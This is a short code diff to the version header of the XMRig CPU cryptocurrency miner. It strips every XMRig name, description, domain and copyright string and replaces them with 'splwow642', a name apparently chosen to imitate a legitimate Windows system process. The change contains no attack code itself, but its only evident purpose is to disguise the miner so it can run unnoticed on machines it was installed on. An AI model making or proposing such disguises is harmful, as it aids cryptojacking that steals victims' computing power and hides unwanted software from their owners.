@@ -24,13 +24,13 @@
 #ifndef __VERSION_H__
 #define __VERSION_H__
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig CPU miner"
+#define APP_ID        "splwow642"
+#define APP_NAME      "splwow642"
+#define APP_DESC      "splwow642"
 #define APP_VERSION   "2.4.1"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2017 xmrig.com"
+#define APP_DOMAIN    "splwow642.xxx"
+#define APP_SITE      "splwow642.xxx"
+#define APP_COPYRIGHT "Copyright (C) 2016-2017 splwow642"
 #define APP_KIND      "cpu"
 
 #define APP_VER_MAJOR  2
